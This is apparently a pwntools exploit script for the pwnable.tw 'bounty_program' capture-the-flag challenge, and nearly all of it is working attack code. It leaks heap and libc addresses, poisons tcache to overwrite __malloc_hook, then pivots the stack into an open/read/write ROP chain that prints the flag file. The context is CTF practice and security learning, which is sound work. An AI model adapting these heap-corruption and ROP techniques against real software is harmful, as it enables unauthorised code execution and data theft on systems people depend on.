'''
docker run --rm -v /home/hank0438:/foo -w /foo -it --cap-add=SYS_PTRACE --security-opt seccomp=unconfined ubuntu:20.04 /bin/bash
'''

from pwn import *


r = process("./bounty_program")
# r = remote("chall.pwnable.tw", 10208)

def login(name, passwd):
    r.recvuntil(b"Your choice: ")
    r.sendline(b"1")
    r.recvuntil(b"Username:")
    r.sendline(name)
    r.recvuntil(b"Password:")
    r.sendline(passwd)

def register(name, passwd, contact):
    r.recvuntil(b"Your choice: ")
    r.sendline(b"2")
    r.recvuntil(b"Username:")
    r.sendline(name)
    r.recvuntil(b"Password:")
    r.sendline(passwd)
    r.recvuntil(b"Contact:")
    r.sendline(contact)


def show():
    r.recvuntil(b"Your choice: ")
    r.sendline(b"3")

def change_content():
    r.recvuntil(b"Your choice: ")
    r.sendline(b"4")

def remove_user():
    r.recvuntil(b"Your choice: ")
    r.sendline(b"5")

def user_info():
    r.recvuntil(b"Your choice: ")
    r.sendline(b"6")

def bounty():
    r.recvuntil(b"Your choice: ")
    r.sendline(b"1")

def add_product(name, company, comment):
    r.sendlineafter(b':', b'1')
    r.sendafter(b':', name)
    r.sendafter(b':', company)
    r.sendafter(b':', comment)

def add_type(size, tp, price=None):
    r.sendlineafter(b'Your choice: ', b'2')
    r.sendlineafter(b'Size:', str(size).encode())
    r.sendlineafter(b'Type:', tp)
    if not price:
        # r.recvuntil(b'Type:')
        return
    r.sendlineafter(b'Price:', str(price).encode())
    r.recvuntil(b'Success')
    
def submit_report(product_id, tp, title, report_id, desc_len, desc):
    r.sendlineafter(b':', b'3')
    r.sendlineafter(b':', str(product_id).encode())
    r.sendlineafter(b':', str(tp).encode())
    r.sendlineafter(b':', title.encode())
    r.sendlineafter(b':', str(report_id).encode())
    r.sendlineafter(b':', str(desc_len).encode())
    r.sendafter(b':', desc)

def delete_report(product, BUG):
    r.sendlineafter(b':', b'8')
    r.sendlineafter(b':', str(product))
    r.sendlineafter(b':', str(BUG))
    r.recvuntil(b'Done')

def delete_type(sz, tp):
    r.sendlineafter(b':', b'4')
    r.sendlineafter(b':', str(sz).encode())
    r.sendlineafter(b'Type:', tp)



user_name = b"aaa"
user_passwd = b"bbb"
contact = b"ccc"

register(user_name, user_passwd, contact)
login(user_name, user_passwd)




bounty()
add_product(b'b', b'b', b'b')



for _ in range(6):
    add_type(0x100, b'GG', 10)
    # input("@")

    delete_type(10, b'GG')
    # input("@")


add_type(0x100, b'\x00')
# input("@")


r.sendlineafter(b':', b'2')
r.sendlineafter(b':', str(0x10000000000).encode()) # size
r.recvuntil(b'type: ')
heap_base = u64(r.recvn(6).ljust(8,b'\x00')) - 0xcd0
print(f'heap_base: {hex(heap_base)}')
r.sendlineafter(b'Price:', b'10')
# input("@")


add_type(0x100, b'\x00')
# input("@")


add_type(0x100, b'TT', 10)
# input("@")

add_type(0x100, b'AA', 10)
# input("@")

add_type(0x100, b'\x00')
# input("@")


r.sendlineafter(b':', b'2')
r.sendlineafter(b':', str(0x10000000000).encode())
r.recvuntil(b'type: ')
libc_base = u64(r.recvn(6).ljust(8,b'\x00')) - 0x3ebda0
print(f'libc_base: {hex(libc_base)}')
r.sendlineafter(b'Price:', b'10')
# input("@")


delete_type(10, b'TT')
# input("@")

delete_type(10, b'AA')
input("@")


# r.interactive()


offset = 0x20000 - (heap_base & 0xff00)
for i in range(5):
    add_type(0x50, b'NN', 10)
    delete_type(10, b'NN')
input("@")

submit_report(0, 'RCE', '123', 0, offset-0x16f0, '1') 
input("@")


add_type(0x408, b'\x00')
input("@")

add_type(0x408, b'\x00')
input("@")

submit_report(0, 'RCE', '123', 1, 0x2c00-0x590, '1')
input("@")

add_type(0x50, b'NN', 10)
delete_type(10, b'NN')
input("@")

add_type(0x50, b'NN', 10)
delete_type(10, b'NN')
input("@")

# overwrite tcache fd
add_type(0x50, b'\x00')
input("@")


r.sendlineafter(b':', b'2')
r.sendlineafter(b':', str(0x10000000000).encode())
r.sendlineafter(b'Price:', b'10')
r.sendlineafter(b'Price:', b'10')

# logout
r.sendlineafter(b':', b'0')
r.sendlineafter(b':', b'7')

# register
malloc_hook = 0x3ebc30
register(b'C', b'C', 'C')
register(b'C', p64(libc_base+malloc_hook), 'C')

login(b'aaa', b'bbb')
r.sendlineafter(b':', b'1')

leave_ret = libc_base+0x54803
pop_rdi = libc_base+0x2155f
pop_rsi = libc_base+0x23e6a
pop_rdx = libc_base+0x1b96
pop_rax = libc_base+0x439c8
syscall_ret = libc_base+0xd2975

target_heap = heap_base+0x16020

raw_input('#')
submit_report(0, 'RCE', '123', 4, 0x408, flat(pop_rdi, target_heap+0x3e0, pop_rsi, 0, pop_rax, 2,syscall_ret, pop_rdi, 4, pop_rsi, heap_base+0x200, pop_rdx, 0x100, pop_rax, 0, syscall_ret, pop_rdi, 1, pop_rax, 1, syscall_ret, word_size=64 ).ljust(0x3e0, b'\x00') + b'/pwnable_tw/flagflagflagg\x00' )
raw_input('#')
submit_report(0, 'RCE', '123', 2, 0x408, p64(leave_ret))

# ROP gogo
r.sendlineafter(b':', b'2')
r.sendlineafter(b':', str(target_heap-0x8))

r.interactive()

'''
/home/bounty_program/flag
/pwnable_tw/flagflagflagg
'''